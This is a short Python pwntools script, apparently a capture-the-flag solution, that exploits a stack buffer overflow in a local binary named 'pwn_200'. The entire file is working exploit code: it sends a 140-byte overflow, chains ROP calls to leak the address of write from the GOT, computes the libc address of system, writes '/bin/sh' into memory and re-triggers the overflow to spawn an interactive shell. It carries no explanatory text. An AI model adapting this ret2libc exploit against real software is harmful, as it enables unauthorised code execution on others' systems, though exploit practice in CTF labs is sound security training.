import time

from pwn import *

#gadgets
pop3ret = 0x80484b6

#addresses
data_addr = 0x8049620
vuln_func = 0x80483f4

#libc
write_libc = 0x000d9510
system_libc = 0x0003fcd0

overflow_pattern = "A"*140
elf = ELF("./pwn_200")
rop = ROP(elf)

rop.call('write', [1, elf.got['write'],4])
rop.call('read', [0, data_addr, 8])
rop.call(vuln_func)

proc = process("./pwn_200")

proc.send(overflow_pattern + str(rop) + "\n")
time.sleep(1)

recv = proc.recv(1024)
proc.send("/bin/sh\0")

leaked = struct.unpack('<I', recv)[0]
real_system = leaked - write_libc + system_libc
print "the real system address is %x" % real_system

payload = flat(real_system, 0x41414141, data_addr)

time.sleep(1)
proc.send(overflow_pattern + payload + "\n")
proc.interactive()



